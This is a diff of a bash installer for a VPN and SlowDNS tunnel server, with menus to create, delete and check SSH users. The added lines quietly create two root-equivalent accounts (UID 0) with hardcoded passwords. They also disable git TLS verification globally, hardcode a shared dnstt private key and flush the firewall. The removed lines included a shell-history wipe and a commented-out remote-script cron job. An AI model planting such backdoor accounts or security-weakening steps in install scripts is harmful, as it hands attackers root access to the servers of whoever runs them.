@@ -6,8 +6,6 @@ GREEN='\033[01;32m';
 WHITE='\033[01;37m';
 YELLOW='\033[00;33m';
 
-rm -rf install
-clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo '                                                              
    ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
@@ -18,14 +16,13 @@ echo '
    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
  '
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo -e " \033[0;31m Wait 10 Seconds to Start Installing!!!!\033[0m"
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-sleep 10
+echo ""
+read -p "Please enter ns host for Slowdns: " NS
+echo $NS > /root/ns.txt
+
 
 startinstall(){
 apt-get update
-apt-get install git -y 
-apt-get install dos2unix -y
 mkdir /etc/update-motd.d
 apt-get install inxi screenfetch lolcat figlet -y
 
@@ -54,6 +51,8 @@ sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
+useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
+useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
 service dropbear restart
 
 cat << \websocket > /usr/local/sbin/websocket.py
@@ -644,7 +643,76 @@ wget -O /usr/bin/badvpn-udpgw "https://github.com/Dexter-Hysteria/status/raw/mtk
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 
-wget -O dnstt https://raw.githubusercontent.com/Dexter-Hysteria/Slowdns/server_script/dnstt; chmod +x dnstt; setarch $(uname -m) -R /root/dnstt
+
+cd /usr/local
+wget https://golang.org/dl/go1.16.2.linux-amd64.tar.gz
+tar xvf go1.16.2.linux-amd64.tar.gz
+
+export GOROOT=/usr/local/go
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+cd /root
+git config --global http.sslverify false
+git clone https://github.com/NuclearDevilStriker/dnstt.git
+cd /root/dnstt/dnstt-server
+go build
+./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
+
+cat <<\EOM > /root/dnstt/dnstt-server/server.key
+124d51aed2abceb984978cfe73bbfaa1b74ec0be869510ac254efc6e9ec7addc
+EOM
+
+cat <<\EOM > /root/dnstt/dnstt-server/server.pub
+5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032
+EOM
+
+NSNAME="$(cat /root/ns.txt)"
+cd /root/dnstt/dnstt-server
+screen -dmS slowdns ./dnstt-server -udp :5300 -privkey-file server.key $NSNAME 127.0.0.1:442
+
+cat <<\EOM > /bin/dnsttauto.sh
+sudo kill $( sudo lsof -i:5300 -t )
+nsname="$(cat /root/ns.txt)"
+cd /root/dnstt/dnstt-server
+screen -dmS slowdns ./dnstt-server -udp :5300 -privkey-file server.key $nsname 127.0.0.1:442
+EOM
+
+echo "net.ipv4.conf.default.rp_filter = 1
+net.ipv4.conf.default.accept_source_route = 0
+kernel.sysrq = 0
+kernel.core_uses_pid = 1
+net.ipv4.tcp_syncookies = 1
+kernel.msgmnb = 65536
+kernel.msgmax = 65536
+kernel.shmmax = 68719476736
+kernel.shmall = 4294967296
+net.ipv4.ip_forward = 1
+fs.file-max = 65535
+net.core.rmem_default = 262144
+net.core.rmem_max = 262144
+net.core.wmem_default = 262144
+net.core.wmem_max = 262144
+net.ipv4.tcp_rmem = 4096 87380 8388608
+net.ipv4.tcp_wmem = 4096 65536 8388608
+net.ipv4.tcp_mem = 4096 4096 4096
+net.ipv4.tcp_low_latency = 1
+net.core.netdev_max_backlog = 4000
+net.ipv4.ip_local_port_range = 1024 65000
+net.ipv4.tcp_max_syn_backlog = 16384" > /etc/sysctl.conf
+sysctl -p
+iptables -F; iptables -X; iptables -Z
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
+iptables -A INPUT -i eth0 -p udp --dport 53 -j ACCEPT
+iptables -A INPUT -i eth0 -p udp --dport 5300 -j ACCEPT
+iptables -A INPUT -i ens3 -p udp --dport 53 -j ACCEPT
+iptables -A INPUT -i ens3 -p udp --dport 5300 -j ACCEPT
+iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 5300
+iptables -A PREROUTING -t nat -i ens3 -p udp --dport 53 -j REDIRECT --to-port 5300
 
 cat <<\EOM >/root/auto
 #!/bin/bash
@@ -696,47 +764,6 @@ echo "SHELL=/bin/bash
 0 * * * * /bin/bash /bin/dnsttauto.sh >/dev/null 2>&1" | crontab -
 }
 
-#installing_api(){
-#clear
-#echo 'Installing Api.'
-#{
-#VPN_Owner='MTknetwork';
-#API_LINK='konekzvpn.online/api/premium';
-#API_KEY='Tknetwork';
-
-#cat <<EOF >/root/authentication.sh
-#!/bin/bash
-#SHELL=/bin/bash
-#PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-#wget -O /root/active.sh "$API_LINK/active.php?key=$API_KEY"
-#sleep 5
-#wget -O /root/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
-#sleep 5
-#wget -O /root/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
-#sleep 15
-#bash /root/active.sh
-#sleep 15
-#bash /root/inactive.sh
-#sleep 15
-#bash /root/deleted.sh
-#EOF
-
-#echo -e "* *\t* * *\troot\tsudo bash /root/authentication.sh" >> "/etc/cron.d/account"
-
-#echo "* * * * * /bin/bash  /root/active.sh >/dev/null 2>&1" | crontab -
-
-#echo "* * * * * /bin/bash  /root/authentication.sh >/dev/null 2>&1" | crontab -
-
-#sh active.sh | tee -a  /root/active.sh
-
-#wget -O /root/active.sh "konekzvpn.online/api/premium/active.php?key=Tknetwork"
-#sleep 5
-#wget -O /root/inactive.sh "konekzvpn.online/premium/inactive.php?key=Tknetwork"
-#sleep 5
-#wget -O /root/deleted.sh "konekzvpn.online/api/premium/deleted.php?key=Tknetwork"
-# }&>/dev/null
-#}
-
 display_menu () {
 clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
@@ -764,21 +791,260 @@ echo -e " \e[92m WEBSOCKET/SSL:\e[0m \e[97m: 443\e[0m"
 echo -e " \e[92m STUNNEL:\e[0m \e[97m: 443\e[0m" 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo -e " \e[92m SlowDns Configuration:\e[0m \e[97m:\e[0m" 
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo ""
-echo -e " \e[92m SLOWDNS HOST/DNS:\e[0m \e[97m: $domain\e[0m"
-echo -e " \e[92m BADVPN PORT:\e[0m \e[97m: 7300\e[0m"
 echo -e " \e[92m SLOWDNS PORT:\e[0m \e[97m: 2222\e[0m" 
-echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m: 8428c0cfc1c81674830336b6383eeb1522e248876a6cc707f1aa32becf524c27\e[0m" 
+echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m: 5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032\e[0m" 
+echo -e " \e[92m NAMESERVER:\e[0m \e[97m: $NS\e[0m" 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+}
+
+controls(){
+cat << \EOM> /usr/local/sbin/base-script
+#!/bin/bash
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+GRN1='\e[32m [\e[0m1\e[32m]\e[0m';
+GRN2='\e[32m [\e[0m2\e[32m]\e[0m';
+GRN3='\e[32m [\e[0m3\e[32m]\e[0m';
+GRN4='\e[32m [\e[0m4\e[32m]\e[0m';
+GRN5='\e[32m [\e[0m5\e[32m]\e[0m';
+GRN6='\e[32m [\e[0m6\e[32m]\e[0m';
+GRN7='\e[32m [\e[0m7\e[32m]\e[0m';
+GRN8='\e[32m [\e[0m8\e[32m]\e[0m';
+GRN9='\e[32m [\e[0m9\e[32m]\e[0m';
+GRN10='\e[32m [\e[0m10\e[32m]\e[0m';
+GRN11='\e[32m [\e[0m11\e[32m]\e[0m';
+GRN12='\e[32m [\e[0m12\e[32m]\e[0m';
+GRN13='\e[32m [\e[0m13\e[32m]\e[0m';
+GRN14='\e[32m [\e[0m14\e[32m]\e[0m';
+GRN15='\e[32m [\e[0m15\e[32m]\e[0m';
+GRN16='\e[32m [\e[0m16\e[32m]\e[0m';
+GRN17='\e[32m [\e[0m17\e[32m]\e[0m';
+GRN18='\e[32m [\e[0m18\e[32m]\e[0m';
+GRN19='\e[32m [\e[0m19\e[32m]\e[0m';
+GRN20='\e[32m [\e[0m20\e[32m]\e[0m';
+GRN21='\e[32m [\e[0m21\e[32m]\e[0m';
+GRN22='\e[32m [\e[0m22\e[32m]\e[0m';
+GRN23='\e[32m [\e[0m23\e[32m]\e[0m';
+GRN24='\e[32m [\e[0m24\e[32m]\e[0m';
+GRN25='\e[32m [\e[0m25\e[32m]\e[0m';
+EOM
+
+cat << \EOM> /usr/local/sbin/dextermenu
+#!/bin/bash
+source /usr/local/sbin/base-script
+
+clear
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo
+echo -e "\e[1;97m Create Account\e[0m"
+echo -e ""
+read -p $'\e[32m  Username: \e[0m' User
+
+# Check If Username Exist, Else Proceed
+egrep "^$User" /etc/passwd >/dev/null
+if [ $? -eq 0 ]; then
+clear
+echo -e ""
+echo -e "$TITLE"
+echo -e "\e[31m Username Already Exists on your server, please try another username\e[0m."
+exit 0
+else
+read -p $'\e[32m  Password: \e[0m' Pass
+#read -p $'\e[32m  Active Days: \e[0m' Days
+echo -e ""
+echo -e ""
+clear
+sleep 1
+IPADDR=$(wget -4qO- http://ipinfo.io/ip)
+#Today=`date +%s`
+#Days_Detailed=$(( $Days * 86400 ))
+#Expire_On=$(($Today + $Days_Detailed))
+#Expiration=$(date -u --date="1970-01-01 $Expire_On sec GMT" +%Y/%m/%d)
+#Expiration_Display=$(date -u --date="1970-01-01 $Expire_On sec GMT" '+%d %b %Y')
+opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g' )"
+dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
+stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
+openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
+#squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}' | xargs | sed -e 's/ /, /g')"
+squidport="8080, 8010"
+websocket="80"
+/usr/sbin/useradd -p $(openssl passwd -1 $Pass) -M $User --shell=/bin/false --no-create-home;
+#useradd -m -s /bin/false > /dev/null
+#egrep "^$User" /etc/passwd &> /dev/null
+#echo -e "$Pass\n$Pass\n" | passwd $User &> /dev/null
+#clear
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e " Your Account:"
+echo -e "\e[32m  Username: \e[0m"$User
+echo -e "\e[32m  Password: \e[0m"$Pass
+#echo -e "\e[32m  Account Expiry: \e[0m"$Expiration_Display
+echo -e ""
+echo -e "\e[32m  Host/IP: \e[0m"$IPADDR
+echo -e "\e[32m  OpenSSH Port: \e[0m"$opensshport
+echo -e "\e[32m  Dropbear Port: \e[0m"$dropbearport
+echo -e "\e[32m  SSL Port: \e[0m"$stunnel4port
+echo -e "\e[32m  Proxy Ports: \e[0m"$squidport
+echo -e "\e[32m  Websockets Port: \e[0m"$websocket
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+fi
+EOM
+
+cat << \EOM> /usr/local/sbin/delete
+#!/bin/bash
+
+clear
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+
+echo
+read -p "Username:" User
+echo -e ""
+sleep 2
+egrep "^$User" /etc/passwd &> /dev/null
+if [ $? -eq 0 ]; then
+	userdel -f $User
+  rm -rf /home/$User
+	clear
+	echo -e ""
+  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+  echo
+	echo -e " User Deleted"
+	echo -e ""
+else
+	clear
+	echo -e ""
+  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+  echo
+	echo -e " User you entered does not exist"
+	echo -e ""
+fi
+EOM
+
+cat << \EOM> /usr/local/sbin/check
+#!/bin/bash
+source /usr/local/sbin/base-script
+
+clear
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo '                                                              
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
+ '
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo
+
+
+if [ -e "/var/log/auth.log" ]; then
+        LOG="/var/log/auth.log";
+fi
+if [ -e "/var/log/secure" ]; then
+        LOG="/var/log/secure";
+fi
+                
+data=( `ps aux | grep -i dropbear | awk '{print $2}'`);
+echo "-----=[ Dropbear User Login ]=-----";
+echo "ID  |  Username  |  IP Address";
+echo "-------------------------------------";
+cat $LOG | grep -i dropbear | grep -i "Password auth succeeded" > /tmp/login-db.txt;
+for PID in "${data[@]}"
+do
+        cat /tmp/login-db.txt | grep "dropbear\[$PID\]" > /tmp/login-db-pid.txt;
+        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
+        USER=`cat /tmp/login-db-pid.txt | awk '{print $10}'`;
+        IP=`cat /tmp/login-db-pid.txt | awk '{print $12}'`;
+        if [ $NUM -eq 1 ]; then
+                echo "$PID - $USER - $IP";
+                fi
+done
+echo " "
+echo "-----=[ OpenSSH User Login ]=-----";
+echo "ID  |  Username  |  IP Address";
+echo "-------------------------------------";
+cat $LOG | grep -i sshd | grep -i "Accepted password for" > /tmp/login-db.txt
+data=( `ps aux | grep "\[priv\]" | sort -k 72 | awk '{print $2}'`);
+
+for PID in "${data[@]}"
+do
+        cat /tmp/login-db.txt | grep "sshd\[$PID\]" > /tmp/login-db-pid.txt;
+        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
+        USER=`cat /tmp/login-db-pid.txt | awk '{print $9}'`;
+        IP=`cat /tmp/login-db-pid.txt | awk '{print $11}'`;
+        if [ $NUM -eq 1 ]; then
+                echo "$PID - $USER - $IP";
+        fi
+done
+
+echo " "
+EOM
+
+chmod +x /usr/local/sbin/*
 }
 
 
 startinstall
+controls
 clear
 display_menu
 ports
-
-rm -rf install
-netstat -tpln
-ln -sf /dev/null ~/.bash_history
